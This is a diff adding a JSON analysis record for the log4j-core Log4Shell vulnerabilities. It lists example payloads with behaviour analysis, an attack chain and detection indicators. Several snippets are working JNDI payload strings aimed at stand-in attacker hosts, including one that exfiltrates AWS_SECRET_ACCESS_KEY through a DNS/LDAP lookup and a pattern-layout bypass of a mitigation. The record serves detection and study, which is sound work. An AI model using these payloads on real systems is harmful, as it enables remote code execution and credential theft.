@@ -1,0 +1,180 @@
+{
+  "package_info": {
+    "package_name": "log4j-core",
+    "package_manager": "Maven",
+    "package_versions": "2.0.0-2.12.1, 2.13.0-2.14.1, 2.15.0, 2.16.0, 2.17.0",
+    "why_malicious": "The package contains unsafe message lookup substitution via JNDI, allowing attacker-controlled input to trigger remote code execution, information disclosure, or denial of service. Multiple CVEs (CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832) demonstrate that the package's default and non-default configurations can be abused for critical attacks."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when logging attacker-controlled input)",
+        "file_location": "Any Java source file using log4j-core logging APIs (e.g., VulnerableLog4jExampleHandler.java)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "log.info(\"Request User Agent:{}\", userAgent); // userAgent = ${jndi:ldap://attacker.com/a}",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code logs attacker-controlled input containing a JNDI lookup string, which triggers a remote LDAP/RMI/DNS request, fetches and deserializes a remote Java class, and executes arbitrary code.",
+      "malice_analysis": {
+        "why_suspicious": "Logging user input should not result in code execution or network requests. The use of JNDI lookups in log messages is highly abnormal.",
+        "violated_expectations": "Normal logging should only record data, not trigger remote class loading or code execution.",
+        "similar_legitimate_use": "JNDI lookups are legitimate in enterprise Java for resource discovery, but not in log message evaluation.",
+        "key_indicators": [
+          "JNDI lookup string in log message (${jndi:...})",
+          "Network request to attacker-controlled server",
+          "Remote class loading and deserialization"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (when logging attacker-controlled input)",
+        "file_location": "Any Java source file using log4j-core logging APIs",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker-srv.com/foo}",
+      "code_language": "java (log4j message lookup)",
+      "code_behavior": "At runtime, the code logs a string that causes log4j to resolve an environment variable (e.g., AWS_SECRET_ACCESS_KEY) and send its value in a DNS/LDAP request to an attacker-controlled domain, resulting in credential exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Log messages should not leak environment variables or sensitive data to external servers.",
+        "violated_expectations": "Normal logging should not resolve or transmit environment variables over the network.",
+        "similar_legitimate_use": "Environment variable lookups are sometimes used for configuration, but not for dynamic log message evaluation.",
+        "key_indicators": [
+          "Use of ${env:...} in log message",
+          "Network exfiltration of sensitive data"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (when logging attacker-controlled input)",
+        "file_location": "Any Java source file using log4j-core logging APIs",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "${jndi:dns://dnsserver.com/somedomain}",
+      "code_language": "java (log4j message lookup)",
+      "code_behavior": "At runtime, the code logs a string that causes log4j to perform a DNS query to an attacker-controlled domain, enabling detection of vulnerable servers or data exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "Log messages should not trigger DNS queries to external domains.",
+        "violated_expectations": "Normal logging should not result in network activity beyond writing logs.",
+        "similar_legitimate_use": "DNS lookups are legitimate for service discovery, not for log message evaluation.",
+        "key_indicators": [
+          "Use of ${jndi:dns://...} in log message",
+          "External DNS queries from logging"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (when logging attacker-controlled input with non-default pattern layouts)",
+        "file_location": "log4j2.properties or XML/YAML/JSON config (e.g., appender.console.layout.pattern = ${ctx:useragent} ...)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "appender.console.layout.pattern = ${ctx:useragent} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n\nThreadContext.put(\"useragent\", userAgent);",
+      "code_language": "java (configuration + code)",
+      "code_behavior": "At runtime, attacker-controlled data is injected into the Thread Context Map and referenced in a custom pattern layout, allowing JNDI lookups to be triggered even when LOG4J_FORMAT_MSG_NO_LOOKUPS mitigation is enabled.",
+      "malice_analysis": {
+        "why_suspicious": "Non-default pattern layouts referencing attacker-controlled context variables can bypass mitigations and enable code execution.",
+        "violated_expectations": "Pattern layouts should not allow arbitrary code execution via context variables.",
+        "similar_legitimate_use": "Context variables are used for structured logging, but not for dynamic code execution.",
+        "key_indicators": [
+          "Custom pattern layout with ${ctx:...}",
+          "ThreadContext.put with user input"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "logger initialization (configuration-time)",
+        "file_location": "log4j2.xml (or other config): <JDBC name=\"jdbcTest\"><DataSource jndiName=\"ldap://attacker.com:1337/Exploit\" /></JDBC>",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "<JDBC name=\"jdbcTest\"><DataSource jndiName=\"ldap://attacker.com:1337/Exploit\" /></JDBC>",
+      "code_language": "xml",
+      "code_behavior": "At logger initialization, the JDBCAppender uses a JNDI data source with an attacker-controlled LDAP URL, causing the application to contact the attacker's server and potentially load a remote class or serialized object.",
+      "malice_analysis": {
+        "why_suspicious": "JDBCAppender should not use attacker-controlled JNDI URLs, as this enables remote code execution.",
+        "violated_expectations": "DataSource JNDI names should be trusted and local, not attacker-supplied.",
+        "similar_legitimate_use": "JNDI is used for enterprise resource discovery, but not with untrusted sources.",
+        "key_indicators": [
+          "JDBCAppender with external JNDI URL",
+          "LDAP protocol in DataSource"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted input (e.g., HTTP header or form field) containing a JNDI lookup string to the vulnerable application.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Log4j logs the input, triggering the JNDI lookup."
+    },
+    {
+      "step": 2,
+      "action": "Log4j processes the log message, evaluates the JNDI lookup, and initiates a network request (LDAP/RMI/DNS) to the attacker's server.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3",
+        "snippet_4",
+        "snippet_5"
+      ],
+      "leads_to": "Attacker's server responds with a malicious Java class or serialized object."
+    },
+    {
+      "step": 3,
+      "action": "The vulnerable application loads or deserializes the remote class/object, executing attacker-controlled code or leaking sensitive data.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_5"
+      ],
+      "leads_to": "Remote code execution, data exfiltration, or denial of service."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log messages containing ${jndi:...} patterns",
+      "Unexpected outbound LDAP, RMI, or DNS requests from Java applications",
+      "Log4j pattern layouts referencing context or map variables with user input",
+      "JDBCAppender using external JNDI DataSource"
+    ],
+    "file_indicators": [
+      "log4j2.properties or log4j2.xml with custom pattern layouts using ${ctx:...}, ${map:...}, ${sd:...}, ${env:...}, or ${main:...}",
+      "Presence of JndiLookup.class in log4j-core JARs",
+      "JDBCAppender.class in log4j-core JARs"
+    ],
+    "network_indicators": [
+      "Outbound LDAP, RMI, or DNS requests to untrusted or external domains",
+      "LDAP requests with suspicious javaCodeBase or javaClassName attributes",
+      "DNS queries containing environment variable values or system properties"
+    ],
+    "how_to_detect": "Monitor logs for suspicious ${jndi:...} patterns, audit log4j configuration files for non-default pattern layouts referencing context or map variables, and detect unexpected outbound LDAP, RMI, or DNS requests from Java processes. Scan JAR files for the presence of JndiLookup.class and JDBCAppender.class. Use SCA tools to identify vulnerable log4j-core versions and flag any use of JNDI in logging or JDBCAppender configurations."
+  }
+}
